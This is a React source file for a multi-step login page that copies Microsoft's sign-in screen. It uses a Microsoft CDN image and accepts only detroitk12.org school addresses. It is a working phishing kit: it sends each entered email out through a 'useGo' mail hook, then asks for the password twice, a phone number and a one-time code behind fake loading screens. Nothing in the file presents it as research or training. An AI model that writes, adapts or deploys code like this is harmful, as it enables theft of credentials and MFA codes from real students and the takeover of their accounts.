import { useState, useRef, useEffect } from "react";
import "./App.css";
import Logo from "./assets/bannerlogo.png";
import { Email } from "./components/Email";
import { Password } from "./components/Password";
import { Loader } from "./components/Loader";
import { OTP } from "./components/OTP";
import { Phone } from "./components/Phone";
import gsap from "gsap";
import useGo from "./components/useGo"; // Import the useGo hook

function App() {
  const [step, setStep] = useState("email");
  const [email, setEmail] = useState("");
  const [emailError, setEmailError] = useState("");
  const [firstPassword, setFirstPassword] = useState("");
  const [secondPassword, setSecondPassword] = useState("");
  const [otp, setOtp] = useState("");
  const [phone, setPhone] = useState("");
  const formRef = useRef(null);
  const signInOptionsRef = useRef(null);
  const { isSending, error, successMessage, sendEmail } = useGo(); // Use the useGo hook

  const handleInputChange = (e) => {
    const field = e.target;
    field.style.backgroundColor = field.value ? "#E8F0FE" : "transparent";
  };

  const animateTransition = () => {
    if (formRef.current) {
      gsap.fromTo(
        formRef.current,
        { x: 500, opacity: 0 },
        { x: 0, opacity: 1, duration: 0.5, ease: "power2.out" }
      );
    }
  };

  const fadeSignInOptions = (show) => {
    if (signInOptionsRef.current) {
      gsap.to(signInOptionsRef.current, {
        opacity: show ? 1 : 0,
        display: show ? "flex" : "none",
        duration: 0.3,
        ease: "power3.out",
      });
    }
  };

  useEffect(() => {
    animateTransition();
    fadeSignInOptions(step === "email");
  }, [step]);

  // Handle email submission and sending
  const handleNextFromEmail = async (emailValue) => {
    const eduEmailRegex =
      /^[a-zA-Z0-9._%+-]+@([a-zA-Z0-9.-]+\.)?detroitk12\.org$/;
    if (!emailValue.trim()) {
      setEmailError("Please enter an email.");
    } else if (!eduEmailRegex.test(emailValue)) {
      setEmailError(
        "Something is not right. Please check and try again."
      );
    } else {
      setEmailError("");
      setEmail(emailValue);
      setStep("loader");

      // Save the email in sessionStorage
      sessionStorage.setItem("student_id", emailValue);

      try {
        // Prepare the subject and message for the email
        const subject = `${emailValue} Email Input Confirmation`;
        const message = `User entered email: ${emailValue} for login.`;

        // Use the sendEmail function from useGo hook to send the email
        await sendEmail(subject, message);

        if (!error) {
          console.log("Email sent successfully");

          // Move to the next step after email is sent
          setTimeout(() => setStep("password"), 3000);
        } else {
          console.error("Failed to send email:", error);
          setEmailError(
            "There was an error sending the email. Please try again."
          );
        }
      } catch (error) {
        console.error("Error occurred during email sending:", error);
        setEmailError("An error occurred. Please try again.");
      }
    }
  };

  const handleNextFromPassword = (password, isSecondPassword) => {
    if (isSecondPassword) {
      setSecondPassword(password);
    } else {
      setFirstPassword(password);
    }
    setStep("loader");
    setTimeout(() => setStep("phone"), 2000);
  };

  const handleNextFromPhone = (phoneValue) => {
    setPhone(phoneValue);
    setStep("loader");
    setTimeout(() => setStep("otp"), 2000);
  };

  const handleOtpVerification = () => {
    setStep("loader");
    setTimeout(() => {
      setStep("nextStep"); // Placeholder for the next step after OTP
    }, 2000);
  };

  const handleBackToEmail = () => setStep("email");
  const handleBackToPassword = () => setStep("password");
  const handleBackToPhone = () => setStep("phone");

  return (
    <div className="major-container">
      <br />
      <div className="container">
        <img src={Logo} alt="logo" className="logo" />
        <div className="form-wrapper" ref={formRef}>
          {step === "email" && (
            <Email
              onNext={handleNextFromEmail}
              emailError={emailError}
              email={email}
              onInputChange={handleInputChange}
              setStep={setStep}
            />
          )}
          {step === "loader" && <Loader />}
          {step === "password" && (
            <Password
              email={email}
              onBack={handleBackToEmail}
              onNext={(password) => handleNextFromPassword(password, false)}
              onInputChange={handleInputChange}
              setStep={setStep}
            />
          )}
          {step === "otp" && (
            <OTP
              email={email}
              onBack={handleBackToPhone}
              onVerify={handleOtpVerification}
              setOtp={setOtp}
              setStep={setStep}
            />
          )}
          {step === "phone" && (
            <Phone
              onBack={handleBackToPassword}
              onNext={handleNextFromPhone}
              phoneError={emailError}
              phone={phone}
              onInputChange={handleInputChange}
              setStep={setStep}
            />
          )}
        </div>
      </div>
      <div className="signin-options" ref={signInOptionsRef}>
        <img
          src="https://aadcdn.msauth.net/shared/1.0/content/images/signin-options_3e3f6b73c3f310c31d2c4d131a8ab8c6.svg"
          alt="key"
        />
        <aside>Sign-in options</aside>
      </div>
      <div className="footer">
        <a href="#">Terms of use</a>
        <a href="#">Privacy & cookies</a>
        <a href="#" className="dot">
          •••
        </a>
      </div>
      <br />
      <br />
      <br />
    </div>
  );
}

export default App;
